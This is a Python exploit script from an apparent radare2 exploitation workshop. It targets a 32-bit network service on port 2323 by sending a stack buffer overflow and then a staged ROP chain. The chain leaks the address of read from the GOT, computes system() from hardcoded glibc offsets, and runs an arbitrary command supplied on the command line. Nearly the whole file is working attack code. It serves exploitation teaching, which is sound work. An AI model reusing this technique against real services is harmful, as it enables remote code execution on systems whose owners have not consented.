import socket
import struct
import time
import sys

# radare2 exploitation workshop
# Many thanks to crowell for helping me to write this


# This function handle endianess.
# Stolen from De Eindbazen
def rop(*args):
    return struct.pack('I'*len(args), *args)


readplt = 0x804832c
writeplt = 0x804830c
read_got = 0x0804961c
vuln_func = 0x080483F4
write_addr = 0x08049530  # where we're going to write
pop3ret = 0x080484b6

# vm glibc offsets
read_local = 0xd9d00
system_local = 0x3e2c0
exit_local = 0x310b0

# local glibc offsets
read_local = 0xdb1b0
system_local = 0x3e770
exit_local = 0x314a0

cmd = 'id'
if len(sys.argv) == 2:
    cmd = sys.argv[1]

system_offset = read_local - system_local
exit_offset = read_local - exit_local

#s = socket.create_connection(('192.168.1.148', 2323))
s = socket.create_connection(('127.0.0.1', 2323))

print('[+] Sending stage1 (leak)')
s.send('A'*140 + rop(
    writeplt,
    pop3ret,
    1,  # stdout
    read_got,
    4,  # sizeof(void*) on x86_32

    # return to the vulnerable function
    vuln_func
))


# receive leaked address of read
leaked_got = struct.unpack('I', s.recv(4))[0]
print('[*] GOT at 0x%08x' % leaked_got)

# compute the address of system using the leaked offset
system = leaked_got - system_offset
print("[*] system(2) at 0x%08x" % system)

# compute the address of exit using the leaked offset
exit = leaked_got - exit_offset
print("[*] exit(2) at 0x%08x" % exit)

# second stage ROP payload
print('[+] Sending stage2 (call)')
s.send('A'*140 + rop(
    readplt,     # read(2)
    pop3ret,
    0,           # stdin
    write_addr,  # where to write
    512,

    # call system
    system,
    exit,
    write_addr
))

print('[+] sending stage3 (payload)')
s.send(cmd + '\0')

print('[+] Reading the result')
print s.recv(9999)
s.close()
